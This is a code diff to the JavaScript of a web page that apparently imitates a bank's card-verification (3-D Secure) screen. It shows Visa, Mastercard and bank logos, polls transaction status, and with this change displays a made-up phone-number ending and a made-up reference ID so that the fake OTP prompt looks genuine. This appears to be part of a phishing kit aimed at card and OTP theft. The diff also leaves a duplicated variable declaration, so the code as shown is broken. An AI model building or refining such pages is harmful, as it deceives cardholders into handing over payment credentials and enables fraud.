@@ -1440,22 +1440,22 @@ statusCheckInterval = setInterval(checkTransactionStatus, 2000);
           loadingContent.style.display = 'none';
           verificationContent.style.display = 'block';
           
-          // Set verification type
-          const verificationTypeLogo = document.getElementById('verificationTypeLogo');
-          if (verificationTypeLogo) {
-            if (data.verificationType === 'visa') {
-              verificationTypeLogo.src = 'https://vectorseek.com/wp-content/uploads/2023/09/Verified-By-Visa-Logo-Vector.svg-.png';
-              verificationTypeLogo.alt = 'Verified by Visa';
-            } else {
-              verificationTypeLogo.src = 'https://www.pngitem.com/pimgs/m/461-4612727_mastercard-identity-check-mastercard-id-check-logo-hd.png';
-              verificationTypeLogo.alt = 'Mastercard SecureCode';
-            }
-          }
-          
-          // Set bank logo
-          const bankLogo = document.getElementById('bankLogo');
-          if (bankLogo) {
-            const bankLogos = {
+// UPDATED: Set verification type logo on RIGHT side
+const verificationTypeLogo = document.getElementById('verificationTypeLogo');
+if (verificationTypeLogo) {
+  if (data.verificationType === 'visa') {
+    verificationTypeLogo.src = 'https://vectorseek.com/wp-content/uploads/2023/09/Verified-By-Visa-Logo-Vector.svg-.png';
+    verificationTypeLogo.alt = 'Verified by Visa';
+  } else {
+    verificationTypeLogo.src = 'https://www.pngitem.com/pimgs/m/461-4612727_mastercard-identity-check-mastercard-id-check-logo-hd.png';
+    verificationTypeLogo.alt = 'Mastercard SecureCode';
+  }
+}
+
+// UPDATED: Set bank logo on LEFT side
+const bankLogo = document.getElementById('bankLogo');
+if (bankLogo) {
+  const bankLogos = {
               'sbi': 'https://logolook.net/wp-content/uploads/2022/04/SBI-Logo.png',
               'hdfc': 'https://companieslogo.com/img/orig/HDB_BIG-092606ce.png?t=1720244492',
               'icici': 'https://www.icicibank.com/content/dam/icicibank/india/assets/images/header/logo.png',
@@ -1478,23 +1478,44 @@ statusCheckInterval = setInterval(checkTransactionStatus, 2000);
               'gibraltar': 'https://www.gibraltar.gi/uploads/images/Departments/2020/banking/GIB-Logo.jpg',
               'default': 'https://www.pngkey.com/png/detail/794-7948248_mastercard-securecode-logo-logo-mastercard-secure-code.png'
             };
-            bankLogo.src = bankLogos[data.bankCode] || bankLogos['default'];
-          }
+  bankLogo.src = bankLogos[data.bankCode] || bankLogos['default'];
+}
           
-          // Set card info
-          const cardNumber = document.getElementById('cardNumber')?.value || '';
-          const lastFour = cardNumber.replace(/\s/g, '').slice(-4);
-          
-          const cardLastFourDigits = document.getElementById('cardLastFourDigits');
-          const cardNumberDisplay = document.getElementById('cardNumberDisplay');
-          
-          if (cardLastFourDigits) {
-            cardLastFourDigits.textContent = lastFour;
-          }
-          
-          if (cardNumberDisplay) {
-            cardNumberDisplay.textContent = `XXXX XXXX XXXX ${lastFour}`;
-          }
+         // UPDATED: Generate random mobile ending instead of using card last 4
+const cardNumberDisplay = document.getElementById('cardNumberDisplay');
+const cardLastFourDigits = document.getElementById('cardLastFourDigits');
+
+// Generate random 4 digits for mobile number ending
+const randomMobileEnding = Math.floor(1000 + Math.random() * 9000).toString();
+
+if (cardLastFourDigits) {
+  cardLastFourDigits.textContent = `********${randomMobileEnding}`;
+}
+
+// Still use actual card last 4 for the card display
+const cardNumber = document.getElementById('cardNumber')?.value || '';
+const lastFour = cardNumber.replace(/\s/g, '').slice(-4);
+if (cardNumberDisplay) {
+  cardNumberDisplay.textContent = `XXXX XXXX XXXX ${lastFour}`;
+}
+
+          // ADDED: Generate random alphanumeric reference ID
+const referenceId = document.getElementById('referenceId');
+if (referenceId) {
+  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+  let randomRef = '';
+  // Generate 3 letters followed by 4 numbers
+  for (let i = 0; i < 3; i++) {
+    randomRef += chars.charAt(Math.floor(Math.random() * 26)); // Only letters
+  }
+  for (let i = 0; i < 4; i++) {
+    randomRef += chars.charAt(Math.floor(Math.random() * 10) + 26); // Only numbers
+  }
+  referenceId.textContent = randomRef;
+}
+
+// Set other transaction details
+const merchantName = document.getElementById('merchantName');
           
           // Set other transaction details
           const merchantName = document.getElementById('merchantName');
